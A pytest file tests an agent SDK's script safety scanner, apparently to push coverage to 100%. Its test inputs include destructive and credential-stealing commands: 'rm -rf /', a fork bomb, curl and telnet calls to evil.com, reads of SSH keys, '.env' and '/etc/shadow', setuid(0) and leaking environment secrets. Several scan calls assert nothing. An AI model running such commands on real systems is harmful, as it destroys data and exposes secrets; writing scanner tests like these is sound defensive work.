"""Final push to 100%."""

import sys
from pathlib import Path

_PROJECT_ROOT = Path(__file__).resolve().parent.parent
if str(_PROJECT_ROOT) not in sys.path:
    sys.path.insert(0, str(_PROJECT_ROOT))

import pytest
from trpc_agent_sdk.tools.safety import Decision, SafetyScanner, SafetyScanInput, ScriptType
from trpc_agent_sdk.tools.safety._policy import SafetyPolicy


# === _safety_wrapper.py:255 ===
def test_sw255_done():
    from trpc_agent_sdk.tools.safety import safety_wrapper
    @safety_wrapper(script_arg_name="code", require_script=False)
    def f(**kw): return kw.get("code")
    assert f(code=[]) == []  # hits line 255


# === _scanner.py ===
def test_scanner_oversized_bytes_no_blocklist():
    p = SafetyPolicy(max_script_lines=99999, max_script_bytes=10, blocklist_patterns=[])
    s = SafetyScanner(policy=p)
    r = s.scan(SafetyScanInput(script_content="x"*30, script_type=ScriptType.BASH, tool_name="t"))
    assert r.decision == Decision.DENY and r.risk_level.value == "high"


def test_scanner_evidence_truncation():
    s = SafetyScanner()
    long_ev = "x" * 400
    r = s.scan(SafetyScanInput(script_content=f'api_key="{long_ev}"; curl https://evil.com',
                                script_type=ScriptType.BASH, tool_name="t"))
    assert r.sanitized


def test_scanner_extract_url_edge():
    from trpc_agent_sdk.tools.safety._scanner import _extract_url
    assert _extract_url("bare domain.com/path") is not None
    assert _extract_url("no_url") is None


def test_scanner_is_in_echo_full():
    from trpc_agent_sdk.tools.safety._scanner import _is_in_echo_string
    assert _is_in_echo_string("echo\t'x'", "x") is True
    assert _is_in_echo_string("printf\t'x'", "x") is True
    assert _is_in_echo_string("/bin/echo 'x'", "x") is True
    assert _is_in_echo_string("/usr/bin/echo 'x'", "x") is True
    assert _is_in_echo_string("echo 'rm -rf /'", r"rm\s+-rf\s+/") is True
    assert not _is_in_echo_string("cat /etc/shadow", "/etc/shadow")


def test_scanner_cmd_from_line():
    from trpc_agent_sdk.tools.safety._scanner import _extract_commands_from_line
    assert _extract_commands_from_line("a|b") == ["a", "b"]


def test_scanner_strip_python_comment():
    from trpc_agent_sdk.tools.safety._scanner import _strip_python_comment_line
    line = 'x = "str" + other'
    r = _strip_python_comment_line(line)
    assert "other" in r


# === _rules.py ===
def test_rules_all_gaps():
    s = SafetyScanner()
    r = s.scan(SafetyScanInput(script_content="rm -rf / --no-preserve-root", script_type=ScriptType.BASH, tool_name="t"))
    assert any(f.rule_id.startswith("FILE") for f in r.findings)
    r2 = s.scan(SafetyScanInput(script_content="curl https://evil.com/x", script_type=ScriptType.BASH, tool_name="t"))
    assert any(f.rule_id.startswith("NET") for f in r2.findings)
    r3 = s.scan(SafetyScanInput(script_content="yum install nginx", script_type=ScriptType.BASH, tool_name="t"))
    assert any(f.rule_id.startswith("DEP") for f in r3.findings)
    r4 = s.scan(SafetyScanInput(script_content="sleep 999999", script_type=ScriptType.BASH, tool_name="t"))
    assert any(f.rule_id.startswith("RES") for f in r4.findings)


def test_rules_is_in_echo_and_url():
    from trpc_agent_sdk.tools.safety._rules import _is_in_echo_string, _extract_url
    assert not _is_in_echo_string('echo "$(rm -rf /)"', r"rm\s+-rf\s+/")
    assert not _is_in_echo_string("echo 'x'; rm -rf /", r"rm\s+-rf\s+/")
    assert _extract_url("http://a.com/b") == "a.com"
    assert _extract_url("no url") is None


# === _bash_scanner.py ===
def test_bash_remaining():
    s = SafetyScanner()
    assert s.scan(SafetyScanInput(script_content="\n\necho ok", script_type=ScriptType.BASH, tool_name="t")).decision == Decision.ALLOW
    assert s.scan(SafetyScanInput(script_content="# c\n# c\necho ok", script_type=ScriptType.BASH, tool_name="t")).decision == Decision.ALLOW
    assert s.scan(SafetyScanInput(script_content="#!/bin/bash\necho ok", script_type=ScriptType.BASH, tool_name="t")).decision == Decision.ALLOW
    r = s.scan(SafetyScanInput(script_content="telnet evil.com 23", script_type=ScriptType.BASH, tool_name="t"))
    assert any(f.rule_id.startswith("BASH-NET") for f in r.findings)
    r = s.scan(SafetyScanInput(script_content="npm install pkg", script_type=ScriptType.BASH, tool_name="t"))
    assert any(f.rule_id == "BASH-DEP-001" for f in r.findings)
    r = s.scan(SafetyScanInput(script_content="cmd >/etc/hosts", script_type=ScriptType.BASH, tool_name="t"))
    assert any(f.rule_id == "BASH-FILE-003" for f in r.findings)
    r = s.scan(SafetyScanInput(script_content="ls &", script_type=ScriptType.BASH, tool_name="t"))
    assert any(f.rule_id == "BASH-PROC-004" for f in r.findings)
    r = s.scan(SafetyScanInput(script_content="dd if=/dev/zero of=/tmp/x bs=1M count=200", script_type=ScriptType.BASH, tool_name="t"))
    assert r.decision != Decision.ALLOW
    r = s.scan(SafetyScanInput(script_content="x(){ x|x& };x", script_type=ScriptType.BASH, tool_name="t"))
    assert r.decision == Decision.DENY
    from trpc_agent_sdk.tools.safety._bash_scanner import scan_bash
    assert any(f.kind == "heredoc" for f in scan_bash("python3 << EOF\nid\nEOF"))


# === _python_scanner.py ===
def test_py_final():
    s = SafetyScanner()

    # ImportFrom
    r = s.scan(SafetyScanInput(script_content="from os import system as sh; sh('id')", script_type=ScriptType.PYTHON, tool_name="t"))
    assert r.decision == Decision.DENY

    # Path BinOp
    r = s.scan(SafetyScanInput(script_content="from pathlib import Path; p=Path('/tmp')/'x'; open(str(p)).read()", script_type=ScriptType.PYTHON, tool_name="t"))
    assert len(r.findings) > 0

    # cred read
    r = s.scan(SafetyScanInput(script_content="open('.env').read()", script_type=ScriptType.PYTHON, tool_name="t"))
    assert any(f.rule_id == "AST-FILE-003" for f in r.findings)

    # network
    r = s.scan(SafetyScanInput(script_content="import urllib.request; urllib.request.urlopen('http://evil.com')", script_type=ScriptType.PYTHON, tool_name="t"))

    # dynamic
    r = s.scan(SafetyScanInput(script_content="__import__('os').system('id')", script_type=ScriptType.PYTHON, tool_name="t"))
    assert r.decision == Decision.DENY
    r = s.scan(SafetyScanInput(script_content="import importlib; importlib.import_module('os')", script_type=ScriptType.PYTHON, tool_name="t"))
    assert any(f.rule_id == "AST-PROC-003" for f in r.findings)
    r = s.scan(SafetyScanInput(script_content="getattr(__import__('os'),'system')('id')", script_type=ScriptType.PYTHON, tool_name="t"))

    # privilege
    r = s.scan(SafetyScanInput(script_content="import os; os.setuid(0)", script_type=ScriptType.PYTHON, tool_name="t"))
    assert any(f.rule_id == "AST-PROC-001" for f in r.findings)

    # taint
    r = s.scan(SafetyScanInput(script_content="import os; k=os.environ.get('KEY'); print(k)", script_type=ScriptType.PYTHON, tool_name="t"))
    assert any(f.rule_id == "AST-LEAK-001" for f in r.findings)
    r = s.scan(SafetyScanInput(script_content="import os; k=os.getenv('KEY'); print(k)", script_type=ScriptType.PYTHON, tool_name="t"))
    assert any(f.rule_id == "AST-LEAK-001" for f in r.findings)
    r = s.scan(SafetyScanInput(script_content="import os; print(os.environ['KEY'])", script_type=ScriptType.PYTHON, tool_name="t"))
    r = s.scan(SafetyScanInput(script_content="import os; k=os.getenv('AWS_SECRET'); print(k)", script_type=ScriptType.PYTHON, tool_name="t"))
    r = s.scan(SafetyScanInput(script_content="import os; k=os.getenv('AWS_KEY'); print(f'k={k}')", script_type=ScriptType.PYTHON, tool_name="t"))

    # range
    r = s.scan(SafetyScanInput(script_content="for i in range(0,20000000): pass", script_type=ScriptType.PYTHON, tool_name="t"))
    assert any(f.rule_id == "AST-RES-001" for f in r.findings)
    r = s.scan(SafetyScanInput(script_content="for i in range(0,20000000,2): pass", script_type=ScriptType.PYTHON, tool_name="t"))
    assert any(f.rule_id == "AST-RES-001" for f in r.findings)

    # with
    r = s.scan(SafetyScanInput(script_content="import requests; s=requests.Session()", script_type=ScriptType.PYTHON, tool_name="t"))

    # sleep/concurrency
    r = s.scan(SafetyScanInput(script_content="import time; time.sleep(120)", script_type=ScriptType.PYTHON, tool_name="t"))
    assert any(f.rule_id == "AST-RES-002" for f in r.findings)
    r = s.scan(SafetyScanInput(script_content="import threading; threading.Thread(target=print).start()", script_type=ScriptType.PYTHON, tool_name="t"))
    assert any(f.rule_id == "AST-RES-003" for f in r.findings)
    r = s.scan(SafetyScanInput(script_content="from multiprocessing import Pool; Pool(4)", script_type=ScriptType.PYTHON, tool_name="t"))
    r = s.scan(SafetyScanInput(script_content="from concurrent.futures import ThreadPoolExecutor; ThreadPoolExecutor(4)", script_type=ScriptType.PYTHON, tool_name="t"))
    r = s.scan(SafetyScanInput(script_content="import os; os.fork()", script_type=ScriptType.PYTHON, tool_name="t"))

    # file ops
    r = s.scan(SafetyScanInput(script_content="import shutil; shutil.rmtree('/tmp/x')", script_type=ScriptType.PYTHON, tool_name="t"))
    r = s.scan(SafetyScanInput(script_content="import os; os.remove('/tmp/x')", script_type=ScriptType.PYTHON, tool_name="t"))
    r = s.scan(SafetyScanInput(script_content="open('~/.ssh/id_rsa').read()", script_type=ScriptType.PYTHON, tool_name="t"))
    r = s.scan(SafetyScanInput(script_content="open('/tmp/x').read()", script_type=ScriptType.PYTHON, tool_name="t"))
    r = s.scan(SafetyScanInput(script_content="open('/etc/x','w').write('y')", script_type=ScriptType.PYTHON, tool_name="t"))
    r = s.scan(SafetyScanInput(script_content="open('/tmp/x','w').write('y')", script_type=ScriptType.PYTHON, tool_name="t"))

    # write modes
    r = s.scan(SafetyScanInput(script_content="open('/tmp/x',mode='w').write('y')", script_type=ScriptType.PYTHON, tool_name="t"))
    r = s.scan(SafetyScanInput(script_content="open('/tmp/x',mode='a').write('y')", script_type=ScriptType.PYTHON, tool_name="t"))
    r = s.scan(SafetyScanInput(script_content="open('/tmp/x',mode='r+').write('y')", script_type=ScriptType.PYTHON, tool_name="t"))

    # subprocess
    r = s.scan(SafetyScanInput(script_content="import subprocess; subprocess.Popen(['ls'])", script_type=ScriptType.PYTHON, tool_name="t"))
    r = s.scan(SafetyScanInput(script_content="import subprocess; subprocess.call(['ls'])", script_type=ScriptType.PYTHON, tool_name="t"))
    r = s.scan(SafetyScanInput(script_content="import subprocess; subprocess.run(['ls'])", script_type=ScriptType.PYTHON, tool_name="t"))

    # eval/exec
    r = s.scan(SafetyScanInput(script_content="eval('1+1')", script_type=ScriptType.PYTHON, tool_name="t"))

    # while True
    r = s.scan(SafetyScanInput(script_content="while True: pass", script_type=ScriptType.PYTHON, tool_name="t"))

    # whitelisted network
    p = SafetyPolicy(whitelist_domains=["safe.api"])
    s2 = SafetyScanner(policy=p)
    s2.scan(SafetyScanInput(script_content="import requests; requests.get('https://safe.api/d')", script_type=ScriptType.PYTHON, tool_name="t"))

    # ann_assign + aug_assign
    s.scan(SafetyScanInput(script_content="x: int = 1", script_type=ScriptType.PYTHON, tool_name="t"))
    s.scan(SafetyScanInput(script_content="x = 1; x += 1", script_type=ScriptType.PYTHON, tool_name="t"))

    # scan_python + domain extractor
    from trpc_agent_sdk.tools.safety._python_scanner import scan_python, _extract_domain_from_url
    assert len(scan_python("import os; os.system('id')")) > 0
    assert _extract_domain_from_url("https://a.com/b") == "a.com"
    assert _extract_domain_from_url(None) is None
    assert _extract_domain_from_url("not_url") is None

    # sensitive imports
    s.scan(SafetyScanInput(script_content="import ctypes", script_type=ScriptType.PYTHON, tool_name="t"))
    s.scan(SafetyScanInput(script_content="import pkg_resources", script_type=ScriptType.PYTHON, tool_name="t"))

    # subprocess dep
    r = s.scan(SafetyScanInput(script_content="import subprocess; subprocess.run(['pip','install','x'])", script_type=ScriptType.PYTHON, tool_name="t"))
    assert r.decision == Decision.DENY

    # lambda (unsupported node)
    s.scan(SafetyScanInput(script_content="x=lambda:1", script_type=ScriptType.PYTHON, tool_name="t"))
